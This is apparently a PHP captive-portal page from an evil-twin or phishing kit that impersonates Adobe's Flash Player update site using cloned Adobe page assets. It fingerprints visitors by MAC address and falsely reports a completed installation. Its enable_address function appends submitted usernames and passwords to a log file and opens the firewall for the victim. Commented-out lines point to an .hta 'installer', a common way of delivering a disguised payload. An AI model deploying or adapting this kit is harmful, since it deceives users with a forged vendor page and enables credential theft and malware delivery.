<?php
// Place in the root of the webserver directory

// Rename these Variables to conform with the target environment 
$server_name = "get";
$domain_name = "adobe.com";
$site_name = "Adobe Flash Player Update";
 
// Path to the arp command on the local server
$arp = "/usr/sbin/arp";
 
// The following file is used to keep track of users
$users = "/var/lib/users";

// Check if we've been redirected by firewall to here.
// If so redirect to registration address
//if ($_SERVER['SERVER_NAME']!="$server_name.$domain_name") {
//  header("location:http://$server_name.$domain_name/download.php?add="
//    .urlencode($_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']));
//  exit;
//}
 
// Attempt to get the client's mac address
$mac = shell_exec("$arp -a ".$_SERVER['REMOTE_ADDR']);
preg_match('/..:..:..:..:..:../',$mac , $matches);
@$mac = $matches[0];
if (!isset($mac)) { exit; }
else {

?>

    <!doctype html>
    <html>
        <head>
            <meta charset="utf-8">
				

            <title>Adobe - Install Adobe Flash Player</title>

            <link href="/wwwimages2.adobe.com/downloadcenter/singlepage/livebeta/css/reset.css" rel="stylesheet">
            <link href="/wwwimages2.adobe.com/downloadcenter/singlepage/livebeta/css/jquery-ui/jquery-ui.css" rel="stylesheet">
            <link href="/wwwimages2.adobe.com/downloadcenter/singlepage/livebeta/css/core.css" rel="stylesheet">

            <!--[if lt IE 9]>
                <link href="/wwwimages2.adobe.com/downloadcenter/singlepage/livebeta/css/ie_fix.css" rel="stylesheet">
            <![endif]-->

            <script src="/wwwimages2.adobe.com/downloadcenter/singlepage/livebeta/js/jquery/jquery.min.js" type="text/javascript"></script>
            <script src="/wwwimages2.adobe.com/downloadcenter/singlepage/livebeta/js/jquery/jquery-ui.min.js" type="text/javascript"></script>
            <script src="/wwwimages2.adobe.com/downloadcenter/singlepage/livebeta/js/jquery/plugins/cookies/cookies.js" type="text/javascript"></script>
            <script src="/wwwimages2.adobe.com/downloadcenter/singlepage/livebeta/js/jquery/plugins/outside/outside.js" type="text/javascript"></script>
            <script src="/wwwimages2.adobe.com/downloadcenter/singlepage/livebeta/js/jquery/plugins/string/string.js" type="text/javascript"></script>
            <script src="/wwwimages2.adobe.com/downloadcenter/singlepage/livebeta/js/jquery/plugins/bxslider/bxslider.js" type="text/javascript"></script>
            <script src="/wwwimages2.adobe.com/downloadcenter/singlepage/livebeta/js/jquery/plugins/selectBox/selectBox.js" type="text/javascript"></script>
            <script src="/wwwimages2.adobe.com/downloadcenter/singlepage/livebeta/js/swfobject/swfobject.js" type="text/javascript"></script>
            <script src="/wwwimages2.adobe.com/downloadcenter/singlepage/livebeta/js/modal.js" type="text/javascript"></script>
            <script src="/wwwimages2.adobe.com/downloadcenter/singlepage/livebeta/js/core.js" type="text/javascript"></script>
			
	        <script type="text/javascript" src="//fonts.adobe.com/yoe7ink.js"></script>
            <script type="text/javascript">try{Typekit.load();}catch(e){}</script>
            <script type="text/javascript">
			if (!Array.prototype.indexOf)
			{
			  Array.prototype.indexOf = function(elt /*, from*/)
			  {
				var len = this.length;

				var from = Number(arguments[1]) || 0;
				from = (from < 0)
					 ? Math.ceil(from)
					 : Math.floor(from);
				if (from < 0)
				  from += len;

				for (; from < len; from++)
				{
				  if (from in this &&
					  this[from] === elt)
					return from;
				}
				return -1;
			  };
			}
            </script>

            <!--[if lt IE 9]>
                <script src="/wwwimages2.adobe.com/downloadcenter/singlepage/livebeta/js/html5shiv.js" type="text/javascript"></script>
            <![endif]-->
             
          
			
            
			<script type="text/javascript" src="/wwwimages2.adobe.com/uber/js/pdc_s_code.js"></script>
			<script type="text/javascript" src="/wwwimages2.adobe.com/uber/js/atm/s_code_acdc.js"></script>
		
             <script>                
                					
                
    
                $(function() {

                    $("#whats_new_panels").bxSlider({
                        controls: false,
                        auto: true,
                        pause: 15000
                    });
                });
                setTimeout(function(){
                    $("#download_messaging").hide();
                    $("#next_button").show();
                }, 10000);
            </script>
            <script type="text/javascript" src="/wwwimages2.adobe.com/downloadcenter/js/livebeta/polarbear.js"></script>
			<script type="text/javascript">
				$(document).ready(function($) {
					try{
					$(window).SiteCatalystWrapper({
						siteCatalyst: s,
						siteCatalystReboot: s_adobe
					}).data("SiteCatalystWrapper");
					}catch (e){}						
					

	
    
    
    

	
	
	
	
	
	
	

    
    
try{
    $(window).data("SiteCatalystWrapper").setProperty ("pageName", "ACDC_FP_NonADM_Installation");
    $(window).data("SiteCatalystWrapper").setProperty ("channel", "ACDC_FlashPlayer");
    $(window).data("SiteCatalystWrapper").setSiteCatalystProperty ("prop32", "en");
    $(window).data("SiteCatalystWrapper").setSiteCatalystRebootProperty ("prop1", "Installation");
    $(window).data("SiteCatalystWrapper").setSiteCatalystRebootProperty ("prop2", "ACDC Downloads");
    $(window).data("SiteCatalystWrapper").setSiteCatalystRebootProperty ("prop3", "https://get2.adobe.com");
    $(window).data("SiteCatalystWrapper").setSiteCatalystRebootProperty ("prop4", "en");
    $(window).data("SiteCatalystWrapper").setSiteCatalystRebootProperty ("prop5", "en:ACDC_FP_NonADM_Installation");
    
        $(window).data("SiteCatalystWrapper").setSiteCatalystRebootProperty ("products", "FlashPlayer_NonADM");
        $(window).data("SiteCatalystWrapper").setSiteCatalystRebootProperty ("eVar73", "ACDC_FlashPlayer_Livebeta");
        $(window).data("SiteCatalystWrapper").setSiteCatalystRebootProperty ("events", "event97");
	
 	 

    

	

	
}catch (e){}
					
					try{
					$(window).data("SiteCatalystWrapper").send();
					$(window).removeData("SiteCatalystWrapper");
					}catch (e){}
				});
        	</script>        
        

			<style>
				body { display : none;}
				.ui-dialog{ filter: none !important; }
			</style>
        <script type='text/javascript'>var locale = 'en';</script></head>

        <body>
        	<script type="text/javascript">
 				if (self == top) {
	    			var theBody = document.getElementsByTagName('body')[0];
	    			theBody.style.display = "block";
	  			} else {
	    			top.location = self.location;
	  			}
			</script>
            <div class="MainContent" id="AUTO_ID_div_main_content">
				<header id="AUTO_ID_singlepage_header">
					<div class="header " id="AUTO_ID_singlepage_div_header">
						<div class="HeaderContent" id="AUTO_ID_singlepage_div_headerContent">
							<span id="AUTO_ID_singlepage_span_home"><a class="HomeLogo" href="http://www.adobe.com" id="AUTO_ID_singlepage_a_home">Home</a></span>
							<p class="TextStep" id="AUTO_ID_singlepage_span_step">Step: 3 of 3</p>
						</div>
					</div>
				</header>
				<section id="AUTO_ID_singlepage_section">
					<div class="section " id="mainSection">
						<div id="ContentColumns-left">
                <div class="ContentColumn ContentColumn-1" id="AUTO_ID_columnleft_div_01">
                
                    <h2 class="HeaderFlashPlayer" id="AUTO_ID_columnleft_h2_header">Adobe Flash Player</h2>
                    <p id="AUTO_ID_columnleft_p_flash_logo">
                        <img src="/wwwimages2.adobe.com/downloadcenter/singlepage/live/images/flash_windows.gif" width="316" height="130" id="AUTO_ID_columnleft_img_flash_logo" alt="">
                    </p>
                    <h3 id="AUTO_ID_db_div_whats_new">What's new?</h3>
<div id="whats_new_panels">
 <div id="AUTO_ID_db_div_01">
  <h4 class="NoBottomMargin" id="AUTO_ID_db_h4_01"><strong>Staying Secure</strong></h4>
  <p id="AUTO_ID_db_p_01">Ensure your Flash Player installation is secure and up to date.  Simply select "Allow Adobe to install updates" during the installation process or choose this option anytime in the Flash Player control panel.</p>
 </div>
 <div id="AUTO_ID_db_div_02">
  <h4 class="NoBottomMargin" id="AUTO_ID_db_h4_02"><strong>Gaming</strong></h4>
  <p id="AUTO_ID_db_p_02">Take your gaming to the next level with Flash Player's incredible Stage 3D graphics.  Smooth, responsive, and incredibly detailed games are a click away.  We've even added support for game controllers so come get your game on!</p>
 </div>
 <div id="AUTO_ID_db_div_03">
  <h4 class="NoBottomMargin" id="AUTO_ID_db_h4_03"><strong>High Performance</strong></h4>
  <p id="AUTO_ID_db_p_03">Experience hardware accelerated HD video with perfect playback using Flash Player.  Recent improvements allow supported Flash content and games to continue to deliver responsive feedback even when your CPU is maxed.</p>
 </div>
</div>
                
                </div>
            </div>
    
            <div id="ContentColumns-right">
                <div class="ContentColumn ContentColumn-2-3" id="AUTO_ID_columnright_div_01">                        
                    <div id="download_messaging" class="AlignVerticalCenter">
                        <p class="DownloadMessage SmallBottomMargin AlignCenter" id="AUTO_ID_columnright_p_download_start_text">Intsallation has completed sucessfully.</p>
                        <p class="AlignCenter" id="AUTO_ID_columnright_p_download_start">
                        </p>
                    </div>
		</div>
            </div>
    
            <noscript><img src="/sstats.adobe.com/b/ss/mxmacromedia/1/H.24.4T/0?pageName=ACDC%5FNoscript&g=http%3A//get.adobe.com/&ch=ACDC%5FNoscript&server=Dylan" height="1" width="1" border="0" alt="" /></noscript><noscript><img src="https://sstats.adobe.com/b/ss/adbacdcprod/1/H.24.4T/0?pageName=ACDC%5FNoscript&g=https://get2.adobe.com&ch=ACDC%5FNoscript" height="1" width="1" border="0" alt="" /></noscript><!--/DO NOT REMOVE/-->
<!-- End Adobe Digital Marketing Suite Tag Management code -->

				
					<footer id="singlepage_footer">
						<div class="footer " id="AUTO_ID_singlepage_div_footer">
						</div>
					</footer>
				
            </div>
			<div id="dualOfferInstallOptions" style="display: none;" title="Install Option"></div>

<?php
    enable_address();
}
?>

        </body>
    </html>

<?php
//    enable_address();
//}


// This function enables the PC on the system by calling iptables, and also saving the
// details in the users file for next time the firewall is reset
 
function enable_address() {
 
    global $user;
    global $pass;
    global $mac;
    global $users;
 

    file_put_contents($users,$_POST['user']."\t".$_POST['pass']."\t".$_SERVER['REMOTE_ADDR']."\t$mac\t".date("m.d.Y")."\n",FILE_APPEND + LOCK_EX);
  
    // Add PC to the firewall
    exec("sudo iptables -I internet 1 -t nat -m mac --mac-source $mac -j RETURN");
    // The following line removes connection tracking for the PC
    // This clears any previous (incorrect) route info for the redirection
    exec("sudo rmtrack ".$_SERVER['REMOTE_ADDR']);

//sleep(120);
//header("Location: install_flash_player.hta");


//    sleep(1);
//    header("location:http://".$_GET['add']);
    exit;
}

  ?>
